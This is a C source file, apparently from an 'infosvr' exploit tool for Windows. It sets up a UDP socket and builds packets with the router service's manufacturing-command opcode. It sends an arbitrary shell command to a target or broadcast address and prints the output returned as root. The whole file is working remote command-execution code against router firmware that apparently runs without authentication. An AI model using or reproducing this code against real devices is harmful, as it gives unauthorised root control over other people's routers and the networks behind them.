#include <windows.h>
#include <stdio.h>
#include <conio.h>
#include <time.h>
#include "..\includes\InfosvrDefines.h"
#include "..\includes\iboxcomh_piece.h"
#include "..\includes\InfosvrExploit.h"

BOOL verifyCmdSizeOK(int cmdLen)
{
	if (cmdLen > MAXINFOSVRCMD)
	{
		printf_s("\nCommand size (%d chars) exceeds max safe infosvr command size (%d chars).\n", cmdLen, MAXINFOSVRCMD);
		printf_s("Command will be executed but infosvr will crash. Continue? ('y' - yes): ");
		int answer = _getch();
		printf_s("%c\n", answer);
		if (answer != 'y' && answer != 'Y')
		{
			return FALSE;
		}
	}
	return TRUE;
}

BOOL setupNetworking(char* targetIP, SOCKET* sock, SOCKADDR_IN* localAddr, SOCKADDR_IN* targetAddr)
{
	WSADATA wsadata;
	if (WSAStartup(MAKEWORD(2,2), &wsadata) != NO_ERROR)	// init WSA
	{
		perror("WSAStartup() failed!\n");
		exit(EXIT_FAILURE);
	}

	*sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);	// work socket
	if (*sock == INVALID_SOCKET)
	{
		char wsaErr[8];
		sprintf_s(wsaErr, sizeof(wsaErr), "%d", WSAGetLastError());
		printf_s("\nFailed to create SOCKET.\tWSA error: %s\n", wsaErr);
		char system_cmd[80];
		sprintf_s(system_cmd, sizeof(system_cmd), "net helpmsg %s", wsaErr);
		system(system_cmd);

		WSACleanup();
		exit(EXIT_FAILURE);
	}
	setsockopt(*sock, SOL_SOCKET, SO_BROADCAST, "ON", sizeof(int));	// to enable broadcast sending

	localAddr->sin_family = AF_INET;
	localAddr->sin_port = htons(PORT_LOCAL);
	localAddr->sin_addr.s_addr = INADDR_ANY;	// receive on any interface
	if (bind(*sock, (SOCKADDR*)localAddr, sizeof(*localAddr)) == SOCKET_ERROR)	// set local address for socket
	{
		char wsaErr[8];
		sprintf_s(wsaErr, sizeof(wsaErr), "%d", WSAGetLastError());
		printf_s("\nFailed to bind SOCKET.\tWSA error: %s\n", wsaErr);
		char system_cmd[80];
		sprintf_s(system_cmd, sizeof(system_cmd), "net helpmsg %s", wsaErr);
		system(system_cmd);

		closesocket(*sock);
		WSACleanup();
		exit(EXIT_FAILURE);
	}

	targetAddr->sin_family = AF_INET;
	targetAddr->sin_port = htons(PORT_TARGET);
	targetAddr->sin_addr.s_addr = inet_addr(targetIP);

	return TRUE;
}

char* getResponse(IBOX_COMM_PKT_HDR_EX* phdr_ex, SOCKET sock, SOCKADDR_IN* targetAddr, int timeout_ms, int ec_flags)
{
	IBOX_COMM_PKT_RES_EX responses[RECV_MAX];	// headers of responses
	memset(responses, 0, sizeof(responses));
	fd_set fdSet;
	TIMEVAL timVal;
	timVal.tv_sec = 0;
	timVal.tv_usec = timeout_ms*1000;

	char pdubuf_res[INFO_PDU_LENGTH];	// receive buffer
	IBOX_COMM_PKT_RES_EX *phdr_res	= (IBOX_COMM_PKT_RES_EX*)pdubuf_res;							// receive buffer header
	PKT_SYSCMD_RES *syscmd_res		= (PKT_SYSCMD_RES*)(pdubuf_res+sizeof(IBOX_COMM_PKT_RES_EX));	// receive buffer body

	static char resBuf[SYSCMDBUF_RES_MAX+1] = "";	// response text (not thread-safe)
	BOOL resGot = FALSE;

	for (int i = 0; i < RECV_MAX; i++)
	{
		FD_ZERO(&fdSet);
		FD_SET(sock, &fdSet);
		int sss = select(NULL, &fdSet, NULL, NULL, &timVal);	// socket select status
		if (sss == SOCKET_ERROR)	// ERROR
		{
			char wsaErr[8];
			sprintf_s(wsaErr, sizeof(wsaErr), "%d", WSAGetLastError());
			printf_s("\ngetResponse(): Error checking SOCKET status.\tWSA error: %s\n", wsaErr);
			char system_cmd[80];
			sprintf_s(system_cmd, sizeof(system_cmd), "net helpmsg %s", wsaErr);
			system(system_cmd);

			closesocket(sock);
			WSACleanup();
			exit(EXIT_FAILURE);
		}
		else if (sss == NULL)	// TIMEOUT (No packets)
		{
			if (i == RECV_MAX-1 && !(ec_flags&EC_FLAG_SILENT) && !(ec_flags&EC_FLAG_RESONLY)) 
			{
				printf_s(RES_LOST_MARK);
			}
			if (i == RECV_MAX-1)	// if last try
			{
				strcpy_s(resBuf, sizeof(resBuf), RES_LOST_MARK);
			}
			continue;	// wait other responses
			//break;	// do not wait other responses
		}
		// OK, packet available
		sss = sizeof(*targetAddr);
		int recvLen = recvfrom(sock, pdubuf_res, sizeof(pdubuf_res), 0, (SOCKADDR*)targetAddr, &sss);	// receive response
		if (recvLen == SOCKET_ERROR)
		{
			char wsaErr[8];
			sprintf_s(wsaErr, sizeof(wsaErr), "%d", WSAGetLastError());
			printf_s("\ngetResponse(): Failed to receive data through SOCKET.\tWSA error: %s\n", wsaErr);
			char system_cmd[80];
			sprintf_s(system_cmd, sizeof(system_cmd), "net helpmsg %s", wsaErr);
			system(system_cmd);

			closesocket(sock);
			WSACleanup();
			exit(EXIT_FAILURE);
		}

		if (phdr_res->ServiceID == NET_SERVICE_ID_IBOX_INFO && phdr_res->OpCode == NET_CMD_ID_MANU_CMD)
		{
			if (phdr_res->PacketType == NET_PACKET_TYPE_CMD)	// usually our broadcast packet
			{
				i--;	// to receive other RIGHT packet instead
				//if (!(ec_flags&EC_FLAG_SILENT) && !(ec_flags&EC_FLAG_RESONLY)) printf_s("%c", 253);	// received our broadcast packet
				continue;	// get next
			}
			else if (phdr_res->PacketType == NET_PACKET_TYPE_RES)	// response
			{
				if (phdr_res->Info != phdr_ex->Info)
				{	// unexpected packet (usually from previous transactions)
					i--;	// to receive other RIGHT packet instead
					if (!(ec_flags&EC_FLAG_SILENT) && !(ec_flags&EC_FLAG_RESONLY)) printf_s("%c", 249);
					continue;	// get next
				}

				BOOL bNewInfo = TRUE;
				for (int j = 0; j < RECV_MAX; j++)	// maybe such packet already received?
				{
					if (responses[j].Info == phdr_res->Info && 
						memcmp(responses[j].MacAddress, phdr_res->MacAddress, sizeof(phdr_res->MacAddress)) == 0)
					{	// if already received
						if (!(ec_flags&EC_FLAG_SILENT) && !(ec_flags&EC_FLAG_RESONLY)) printf_s("%c", 254);	// print 'duplicate' sign
						bNewInfo = FALSE;
						break;
					}
				}

				if (bNewInfo)
				{
					int resLen;	// different firmware return response length in different byte order
					if (syscmd_res->len > SYSCMDBUF_RES_MAX)
					{
						if (ntohs(syscmd_res->len) > SYSCMDBUF_RES_MAX)
						{	// bad if it happens
							resLen = SYSCMDBUF_RES_MAX;
						}
						else
						{
							resLen = ntohs(syscmd_res->len);	// network byte order (stock firmware?)
						}
					}
					else
					{
						resLen = syscmd_res->len;	// normal byte order (AsusWRT firmware?)
					}

					memcpy_s(resBuf, sizeof(resBuf), syscmd_res->res, resLen);
					resBuf[resLen] = '\0';
					resGot = TRUE;
					
					if (!(ec_flags&EC_FLAG_SILENT))
					{
						printf_s("%s", resBuf);	// print command output
					}

					if (!(ec_flags&EC_FLAG_SILENT) && !(ec_flags&EC_FLAG_RESONLY))
					{
						if (resLen >= SYSCMDBUF_RES_MAX)
						{
							printf_s("\nResponse from %s (%d chars - %c).\n", inet_ntoa(targetAddr->sin_addr), resLen, 19);	// command output may be truncated
						}
						else
						{
							printf_s("\nResponse from %s (%d chars).\n", inet_ntoa(targetAddr->sin_addr), resLen);
						}
					}

					responses[i].Info = phdr_res->Info;								// save response ID
					memcpy_s(responses[i].MacAddress, sizeof(responses[i].MacAddress), 
						phdr_res->MacAddress, sizeof(phdr_res->MacAddress));// save response MacAddress

					if (!(ec_flags&EC_FLAG_SILENT) && !(ec_flags&EC_FLAG_RESONLY) && (ec_flags&EC_FLAG_VERBOSE))
					{
						printf_s("\n\t[Verbose info]:\n");
						printf_s("phdr_res->ServiceID\t= 0x%.2x\t(%d)\n", phdr_res->ServiceID, phdr_res->ServiceID);
						printf_s("phdr_res->PacketType\t= 0x%.2x\t(%d)\n", phdr_res->PacketType, phdr_res->PacketType);
						printf_s("phdr_res->OpCode\t= 0x%.4x\t(%d)\n", phdr_res->OpCode, phdr_res->OpCode);
						printf_s("phdr_res->Info\t\t= 0x%.8x\t(%d)\n", phdr_res->Info, phdr_res->Info);
						printf_s("phdr_res->MacAddress \t= %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n",	
							phdr_res->MacAddress[0], 
							phdr_res->MacAddress[1], 
							phdr_res->MacAddress[2], 
							phdr_res->MacAddress[3], 
							phdr_res->MacAddress[4], 
							phdr_res->MacAddress[5]);
					}
				}
			}
			else
			{	// unknown packet type
				if (!(ec_flags&EC_FLAG_SILENT) && !(ec_flags&EC_FLAG_RESONLY)) printf_s("%c", 15);
				continue;	// get next
			}
		}
		else
		{	// unknown service/cmd packet
			if (!(ec_flags&EC_FLAG_SILENT) && !(ec_flags&EC_FLAG_RESONLY)) printf_s("%c", 15);
			continue;	// get next
		}

		if (resGot)	// if response received - its no sense to wait its duplicates
		{
			break;
		}
	}
	return resBuf;
}

char* execSysCmd(char* cmdline, SOCKET sock, SOCKADDR_IN* targetAddr, int timeout_ms, int ec_flags)
{
	char pdubuf[INFO_PDU_LENGTH];	// output buffer
	memset(pdubuf, 0, sizeof(pdubuf));
	IBOX_COMM_PKT_HDR_EX *phdr_ex = (IBOX_COMM_PKT_HDR_EX*)pdubuf;				// output buffer header
	phdr_ex->ServiceID	= NET_SERVICE_ID_IBOX_INFO;	// MUST be such
	phdr_ex->PacketType = NET_PACKET_TYPE_CMD;		// MUST be such
	phdr_ex->OpCode		= NET_CMD_ID_MANU_CMD;		// to exec system commands
	PKT_SYSCMD *syscmd = (PKT_SYSCMD*)(pdubuf+sizeof(IBOX_COMM_PKT_HDR_EX));	// output buffer body

	strcpy_s((char*)syscmd->cmd, sizeof(syscmd->cmd), cmdline);	// place cmdline to buffer
	syscmd->len = strlen((char*)syscmd->cmd);					// cmdline length

	if (!verifyCmdSizeOK(syscmd->len))
	{
		closesocket(sock);
		WSACleanup();
		exit(EXIT_FAILURE);
	}

	phdr_ex->Info = clock();
	if (!(ec_flags&EC_FLAG_SILENT) && !(ec_flags&EC_FLAG_RESONLY)) 
		printf_s("Sending to %s command (%d chars):\n\nroot:/# %s\n", inet_ntoa(targetAddr->sin_addr), syscmd->len, syscmd->cmd);
	int nSent = sendto(sock, pdubuf, sizeof(pdubuf), 0, (SOCKADDR*)targetAddr, sizeof(*targetAddr));	// send cmd
	if (nSent == SOCKET_ERROR)
	{
		char wsaErr[8];
		sprintf_s(wsaErr, sizeof(wsaErr), "%d", WSAGetLastError());
		printf_s("\nuploadFile(): Failed to send data through SOCKET.\tWSA error: %s\n", wsaErr);
		char system_cmd[80];
		sprintf_s(system_cmd, sizeof(system_cmd), "net helpmsg %s", wsaErr);
		system(system_cmd);

		closesocket(sock);
		WSACleanup();
		exit(EXIT_FAILURE);
	}

	return getResponse(phdr_ex, sock, targetAddr, timeout_ms, ec_flags);
}